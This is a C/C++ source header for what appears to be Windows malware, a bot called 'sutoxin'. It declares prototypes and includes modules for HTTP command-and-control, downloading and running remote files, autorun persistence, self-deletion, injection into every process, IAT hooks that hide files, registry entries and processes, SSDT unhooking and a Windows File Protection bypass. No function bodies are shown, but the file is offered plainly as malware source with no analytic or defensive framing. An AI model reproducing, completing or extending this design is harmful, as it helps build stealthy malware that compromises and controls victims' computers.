	// -------------------------------------------------------------------------------- //
	#pragma optimize("gsy", on) 
	#pragma comment(linker, "/RELEASE")
	#pragma comment(linker, "/ENTRY:EntryPoint")
	#pragma comment(linker, "/BASE:0x29A00000")
	#pragma comment(linker, "/MERGE:.rdata=.data")
	#pragma comment(linker, "/MERGE:.text=.data")
	#pragma comment(linker, "/MERGE:.reloc=.data")
	#pragma comment(linker, "/SECTION:.text,EWRX")
	#pragma comment(linker, "/SECTION:.xdata,EWRX")
	#pragma comment(linker, "/IGNORE:4078")
	#pragma comment(linker, "/FILEALIGN:0x200")
	#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
	// -------------------------------------------------------------------------------- //
	#include 	<windows.h>
	#include 	<shlwapi.h>
	#include 	<Tlhelp32.h>
	#include 	<stdio.h>
	#include 	<imagehlp.h>
	#include 	<wininet.h>
	#include	<shlobj.h>
	#include 	"ntdll.h"
	// -------------------------------------------------------------------------------- //
	#pragma 	comment(lib,"user32.lib")
	#pragma 	comment(lib,"kernel32.lib")
	#pragma 	comment(lib,"ws2_32.lib")
	#pragma 	comment(lib,"wininet.lib")
	#pragma 	comment(lib,"advapi32.lib")
	#pragma 	comment(lib,"urlmon.lib")
	#pragma 	comment(lib,"shlwapi.lib")
	#pragma 	comment(lib,"imagehlp.lib")
	#pragma		comment(lib,"shell32.lib")
	#pragma 	comment(lib,"ntdll.lib")
	// -------------------------------------------------------------------------------- //
	#include	"configs.hpp"
	// -------------------------------------------------------------------------------- //
	#define		SE_DEBUG_PRIV 	 			"SeDebugPrivilege"
	#define 	BASEADDRESS					0x29A00000  
	#define		KERNEL32_DLL				"kernel32.dll"
	#define		ADVAPI32_DLL				"advapi32.dll"
	#define		SHELL32_DLL					"shell32.dll"
	#define		WS2_32_DLL					"ws2_32.dll"
	#define		URLMON_DLL					"urlmon.dll"
	#define		WININET_DLL					"wininet.dll"
	#define		WINMM_DLL					"winmm.dll"
	#define		IMGHLP_DLL					"imagehlp.dll"
	#define		USER32_DLL					"user32.dll"
	// -------------------------------------------------------------------------------- //
	
	typedef struct SUTOXIN_STRUCT
	{
			char  	pcname[256];
			char  	rnduid[256];
			char  	host[256];
			char  	path[256];
			char  	injproc[256];
			
	} SUTOXIN_STRUCT;
	static SUTOXIN_STRUCT 	sutoxin;
	
	DWORD 	WINAPI 		CheckDTaskById(char *TaskID);
	DWORD 	WINAPI 		AddDTaskToDb(char *TaskID);
	DWORD 	WINAPI 		DeleteDTaskFromDb(char *TaskID);
	int 	WINAPI 		GetRate();
	DWORD 	WINAPI 		ChangeRate(char *rate);
	DWORD 	WINAPI 		CommandInterpretator(char *cmdata, LPVOID lParam);
	void 	WINAPI 		GenerateComputerName(char *lpPcName, char *szRandId);
	DWORD 	WINAPI 		GetCommandViaHTTP(char *taskid, int mode, LPVOID lParam);
	
	
	HANDLE	WINAPI 		StartThread(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID param);
	DWORD 	WINAPI 		GetIpByHostname(char *host);
	DWORD 	WINAPI 		GetProcessIdByName(char *ProcessName);
	BOOL 	WINAPI 		SetPrivilege(DWORD dwNamePriv, char *SeNamePriv, BOOL EnableTF);
//	BOOL 	WINAPI 		SetPrivilege(char *SeNamePriv, BOOL EnableTF);
	void 	WINAPI 		Parse_Url(char *url, char *host, char *path);
	DWORD	WINAPI 		DownloadFile(char *Host, short *Port, char *Path, char *SaveTo);
	DWORD 	WINAPI 		DownloadAndExecuteFile(char *FileUrl, char *TaskID, int mode);
	
	DWORD 	WINAPI 		AddToAutoRun(int mode);
	DWORD 	WINAPI 		DeleteSelf(LPVOID lParam);
	
	DWORD 	WINAPI		CheckInternetConnection(LPVOID lParam);
	
	DWORD 	WINAPI 		SetUpStealthHooks(HANDLE hmodCaller);
	DWORD 	WINAPI 		Stealth();
	DWORD 	WINAPI 		StealthMain(LPVOID lpParam);
	void 	WINAPI 		StealthLoadDlls();

	DWORD 	WINAPI 		ProcessInject(HANDLE p_handle, DWORD (WINAPI f_Main)(LPVOID lParam), LPVOID lParam);
	DWORD 	WINAPI   	StartProcInject(DWORD dwPid, LPTSTR p_Name, DWORD (WINAPI f_Main)(LPVOID lpParam),LPVOID lParam);
	DWORD 	WINAPI 		InjectAllProcesses(DWORD (WINAPI f_Main)(LPVOID));
	
	DWORD 	WINAPI 		Start_HTTP_Thread(SUTOXIN_STRUCT sutoxin);
	DWORD 	WINAPI 		ThreadMain_StartAllProcInjThread(LPVOID lParam);
	DWORD	WINAPI 		ThreadMain_MainInjThread(LPVOID lParam);
	DWORD 	WINAPI 		Main_InjectProcess(LPVOID lpParam);

	static 	DWORD 	WINAPI ReplaceIAT(PCSTR pszCModName, PROC pfnCurrent, PROC pfnNew, HMODULE hCModule);
	static 	DWORD 	WINAPI ReplaceIATEntryInAllMods(PCSTR pszCModName, PROC pfnCurrent, PROC pfnNew);
	
	static 	DWORD 	WINAPI StealthMain(LPVOID lpParam);
	static	DWORD 	WINAPI Stealth();
	static 	HANDLE 	WINAPI xFindFirstFileW (PCWSTR lpFileName, PWIN32_FIND_DATAW lpFindFileData);
	static  BOOL 	WINAPI xFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
	static 	LONG 	WINAPI xRegEnumValueW(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, 
									  LPDWORD lpcValueName,  LPDWORD lpReserved, 
									  LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
	static BOOL 	WINAPI xCreateProcessW(LPCWSTR lpApplicationName, 
									LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
									LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, 
									DWORD dwCreationFlags, LPVOID lpEnvironment, 
									LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, 
									LPPROCESS_INFORMATION lpProcessInformation);
	static 		HMODULE WINAPI xLoadLibraryW(PCWSTR a);
	static 		HMODULE WINAPI xLoadLibraryExW(PCWSTR a, HANDLE b, DWORD c);
	BOOL 		DrvOpenDevice(PWSTR DriverName, HANDLE *lphDevice);
	DWORD 		Unhook_SpoofDriver();
	void 		WFPBypass(char *lpFileName);

	#include	"functions.cpp"		// some functions
	#include	"tasks.cpp"			// work with tasks
	#include	"rate.cpp"			// work with refresh rate
	#include	"http-bot.cpp"		// http communication
	#include	"downloader.cpp"	// download functions
	#include	"autorun.cpp"		// autorun functions
	#include	"iat-hook.cpp"		// iat hooking engine
	#include	"injection.cpp"		// process-injection
	#include 	"sst-unhook.cpp"	// sst unhook engines
	#include	"wfpbypass.cpp"		// bypass WFP
	
	
	// -------------------------------------------------------------------------------- //